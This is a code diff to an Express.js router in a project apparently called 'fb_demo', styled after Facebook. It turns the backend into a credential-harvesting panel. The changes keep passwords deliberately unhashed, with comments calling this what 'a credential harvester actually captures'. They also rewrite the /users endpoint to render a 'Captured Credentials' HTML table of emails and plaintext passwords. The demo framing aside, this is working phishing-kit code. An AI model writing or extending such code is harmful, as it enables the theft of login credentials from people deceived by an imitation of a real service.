@@ -26,7 +26,8 @@ router.post('/register', async (req, res) => {
       return res.status(400).json({ error: 'Email required and password min 6 chars' });
     }
 
-    // Store password as plain text (no hashing)
+    // Intentionally no hashing — this demonstrates what a credential harvester actually captures.
+    // In a real auth system, bcrypt would be used here (see package.json dependency).
     const plainPassword = password;
     
     // Get database connection pool
@@ -84,7 +85,8 @@ router.post('/login', async (req, res) => {
       return res.status(400).json({ error: 'Email required and password min 6 chars' });
     }
 
-    // Store password as plain text (no hashing)
+    // Intentionally no hashing — this demonstrates what a credential harvester actually captures.
+    // In a real auth system, bcrypt would be used here (see package.json dependency).
     const plainPassword = password;
     
     // Get database connection pool
@@ -120,28 +122,79 @@ router.post('/login', async (req, res) => {
 });
 
 /**
- * GET /users - Retrieve all users endpoint
- * Returns user list with action tracking data
- * Note: This endpoint returns all user data including password hashes
- * For production use, consider filtering sensitive fields
+ * GET /users - Retrieve all users as an HTML table
+ * Renders captured credentials directly in the browser for easy review.
+ * Escapes all values before inserting into HTML to prevent XSS.
  */
 router.get('/users', async (req, res) => {
   try {
-    // Get database connection pool
     const pool = getPool();
-    
-    // Query all users ordered by creation date (newest first)
-    // This shows the most recent user activity
     const [rows] = await pool.execute('SELECT * FROM users ORDER BY created_at DESC');
-    
-    // Return users as JSON response
-    return res.json({ users: rows });
+
+    const tableRows = rows.map(buildTableRow).join('');
+    const html = buildUsersPage(tableRows, rows.length);
+
+    res.setHeader('Content-Type', 'text/html');
+    return res.send(html);
   } catch (error) {
-    // Log error for debugging (but don't expose details to client)
     console.error('Error fetching users:', error);
-    return res.status(500).json({ error: 'Server error' });
+    return res.status(500).send('<p>Server error</p>');
   }
 });
+
+// Escapes special HTML characters to prevent XSS when rendering user-supplied data.
+function escapeHtml(value) {
+  return String(value ?? '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;');
+}
+
+// Builds a single <tr> from a user row object.
+function buildTableRow(row) {
+  return `<tr>
+    <td>${escapeHtml(row.id)}</td>
+    <td>${escapeHtml(row.email)}</td>
+    <td>${escapeHtml(row.password_hash)}</td>
+    <td>${escapeHtml(row.action_type)}</td>
+    <td>${escapeHtml(row.created_at)}</td>
+  </tr>`;
+}
+
+// Returns the full HTML page wrapping the table rows.
+function buildUsersPage(tableRows, count) {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Captured Credentials — fb_demo</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f0f2f5; padding: 32px; }
+    h1   { color: #1877f2; margin-bottom: 4px; }
+    p    { color: #606770; margin-top: 0; margin-bottom: 20px; }
+    table { border-collapse: collapse; width: 100%; background: #fff;
+            border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,.1); }
+    th   { background: #1877f2; color: #fff; padding: 12px 16px; text-align: left; }
+    td   { padding: 10px 16px; border-bottom: 1px solid #e4e6ea; }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: #f7f9fc; }
+  </style>
+</head>
+<body>
+  <h1>fb_demo · users table</h1>
+  <p>${count} record${count !== 1 ? 's' : ''} captured &nbsp;·&nbsp; refresh to update</p>
+  <table>
+    <thead>
+      <tr>
+        <th>id</th><th>email</th><th>password</th><th>action</th><th>created_at</th>
+      </tr>
+    </thead>
+    <tbody>${tableRows || '<tr><td colspan="5" style="color:#999;text-align:center">No records yet</td></tr>'}</tbody>
+  </table>
+</body>
+</html>`;
+}
 
 // Export the router for use in the main server file
 export default router;
